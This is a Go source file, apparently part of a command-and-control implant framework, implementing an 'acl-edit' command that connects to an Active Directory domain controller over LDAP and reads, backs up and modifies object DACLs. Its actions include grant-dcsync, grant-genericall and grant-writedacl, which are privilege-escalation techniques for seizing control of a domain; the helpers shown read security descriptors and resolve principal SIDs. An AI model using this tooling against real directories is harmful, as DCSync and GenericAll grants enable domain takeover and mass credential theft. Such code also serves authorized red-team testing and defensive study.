package commands

import (
	"fmt"
	"strings"

	"fawkes/pkg/structs"

	ber "github.com/go-asn1-ber/asn1-ber"
	"github.com/go-ldap/ldap/v3"
)

type AclEditCommand struct{}

func (c *AclEditCommand) Name() string        { return "acl-edit" }
func (c *AclEditCommand) Description() string { return "Read and modify Active Directory DACLs" }

type aclEditArgs struct {
	Action    string `json:"action"`
	Server    string `json:"server"`
	Port      int    `json:"port"`
	Username  string `json:"username"`
	Password  string `json:"password"`
	BaseDN    string `json:"base_dn"`
	UseTLS    bool   `json:"use_tls"`
	Target    string `json:"target"`
	Principal string `json:"principal"`
	Right     string `json:"right"`
	Backup    string `json:"backup"` // base64-encoded SD for restore
}

func (c *AclEditCommand) Execute(task structs.Task) structs.CommandResult {
	allActions := "read, add, remove, grant-dcsync, grant-genericall, grant-writedacl, backup, restore"
	if task.Params == "" {
		return errorf("Error: parameters required. Use -action <%s> -server <DC> -target <object>", allActions)
	}

	args, parseErr := unmarshalParams[aclEditArgs](task)
	if parseErr != nil {
		return *parseErr
	}
	defer structs.ZeroString(&args.Password)

	if args.Server == "" {
		return errorResult("Error: server parameter required (domain controller IP or hostname)")
	}

	if args.Target == "" && args.Action != "restore" {
		return errorResult("Error: target parameter required")
	}

	if args.Port <= 0 {
		if args.UseTLS {
			args.Port = 636
		} else {
			args.Port = 389
		}
	}

	action := strings.ToLower(args.Action)
	validActions := map[string]bool{
		"read": true, "add": true, "remove": true,
		"grant-dcsync": true, "grant-genericall": true, "grant-writedacl": true,
		"backup": true, "restore": true,
	}
	if !validActions[action] {
		return errorf("Unknown action: %s\nAvailable: %s", args.Action, allActions)
	}

	// Connect
	conn, err := ldapConnect(ldapQueryArgs{
		Server: args.Server, Port: args.Port, UseTLS: args.UseTLS,
		Username: args.Username, Password: args.Password,
	})
	if err != nil {
		return errorf("Error connecting to LDAP server %s:%d: %v", args.Server, args.Port, err)
	}
	defer conn.Close()

	// Bind
	if err := ldapBind(conn, ldapQueryArgs{Username: args.Username, Password: args.Password}); err != nil {
		return errorf("Error binding to LDAP: %v", err)
	}

	// Determine base DN
	baseDN := args.BaseDN
	if baseDN == "" {
		baseDN, err = detectBaseDN(conn)
		if err != nil {
			return errorf("Error detecting base DN: %v. Specify -base_dn manually.", err)
		}
	}

	switch action {
	case "read":
		return aclEditRead(conn, args, baseDN)
	case "add":
		return aclEditAdd(conn, args, baseDN)
	case "remove":
		return aclEditRemove(conn, args, baseDN)
	case "grant-dcsync":
		return aclEditGrantDCSync(conn, args, baseDN)
	case "grant-genericall":
		return aclEditGrantGenericAll(conn, args, baseDN)
	case "grant-writedacl":
		return aclEditGrantWriteDACL(conn, args, baseDN)
	case "backup":
		return aclEditBackup(conn, args, baseDN)
	case "restore":
		return aclEditRestore(conn, args, baseDN)
	default:
		return errorResult("Unknown action")
	}
}

// aclEditReadSD reads the raw nTSecurityDescriptor, trying with SD_FLAGS control first,
// falling back to a plain read if the control is not supported.
func aclEditReadSD(conn *ldap.Conn, targetDN string) ([]byte, error) {
	// Try with LDAP_SERVER_SD_FLAGS_OID control for DACL only (0x04)
	sdFlagsControl := buildSDFlagsControl(0x04) // DACL_SECURITY_INFORMATION
	searchReq := ldap.NewSearchRequest(
		targetDN,
		ldap.ScopeBaseObject,
		ldap.NeverDerefAliases,
		1, 10, false,
		"(objectClass=*)",
		[]string{"nTSecurityDescriptor"},
		[]ldap.Control{sdFlagsControl},
	)

	result, err := conn.Search(searchReq)
	if err != nil {
		// Fallback: try without the control (some DCs reject it)
		searchReq.Controls = nil
		result, err = conn.Search(searchReq)
		if err != nil {
			return nil, fmt.Errorf("querying nTSecurityDescriptor: %w", err)
		}
	}

	if len(result.Entries) == 0 {
		return nil, fmt.Errorf("object not found: %s", targetDN)
	}

	sd := result.Entries[0].GetRawAttributeValue("nTSecurityDescriptor")
	if len(sd) < 20 {
		return nil, fmt.Errorf("nTSecurityDescriptor too short (%d bytes). May need elevated privileges", len(sd))
	}

	return sd, nil
}

// buildSDFlagsControl creates LDAP_SERVER_SD_FLAGS_OID (1.2.840.113556.1.4.801)
// This control specifies which parts of the security descriptor to return/modify.
// flags: 0x01=Owner, 0x02=Group, 0x04=DACL, 0x08=SACL
func buildSDFlagsControl(flags uint32) *ldap.ControlString {
	// BER encode as SDFlagsRequestValue ::= SEQUENCE { Flags INTEGER }
	// Hardcode the encoding for small flag values (0-127) which fit in 1 byte
	if flags <= 127 {
		controlValue := string([]byte{0x30, 0x03, 0x02, 0x01, byte(flags)})
		return ldap.NewControlString("1.2.840.113556.1.4.801", true, controlValue)
	}
	// For larger values, use BER library
	seq := ber.Encode(ber.ClassUniversal, ber.TypeConstructed, ber.TagSequence, nil, "SDFlagsRequestValue")
	seq.AppendChild(ber.Encode(ber.ClassUniversal, ber.TypePrimitive, ber.TagInteger, int64(flags), "Flags"))
	controlValue := seq.Bytes()
	return ldap.NewControlString("1.2.840.113556.1.4.801", true, string(controlValue))
}

// resolvePrincipalSID resolves a principal name to a binary SID via LDAP
func resolvePrincipalSID(conn *ldap.Conn, principal string, baseDN string) ([]byte, string, error) {
	// If it looks like a SID string, convert directly
	if strings.HasPrefix(principal, "S-1-") {
		sidBytes := daclSIDToBytes(principal)
		if sidBytes == nil {
			return nil, "", fmt.Errorf("invalid SID format: %s", principal)
		}
		return sidBytes, principal, nil
	}

	// Try resolving by sAMAccountName
	filter := fmt.Sprintf("(sAMAccountName=%s)", ldap.EscapeFilter(principal))
	searchReq := ldap.NewSearchRequest(
		baseDN,
		ldap.ScopeWholeSubtree,
		ldap.NeverDerefAliases,
		1, 10, false,
		filter,
		[]string{"objectSid", "sAMAccountName"},
		nil,
	)

	result, err := conn.Search(searchReq)
	if err != nil {
		return nil, "", fmt.Errorf("LDAP search error: %w", err)
	}

	if len(result.Entries) == 0 {
		// Try by CN
		filter = fmt.Sprintf("(cn=%s)", ldap.EscapeFilter(principal))
		searchReq.Filter = filter
		result, err = conn.Search(searchReq)
		if err != nil || len(result.Entries) == 0 {
			return nil, "", fmt.Errorf("principal not found: %s", principal)
		}
	}

	sidBytes := result.Entries[0].GetRawAttributeValue("objectSid")
	if len(sidBytes) < 8 {
		return nil, "", fmt.Errorf("invalid objectSid for %s", principal)
	}

	sidStr := adcsParseSID(sidBytes)
	return sidBytes, sidStr, nil
}
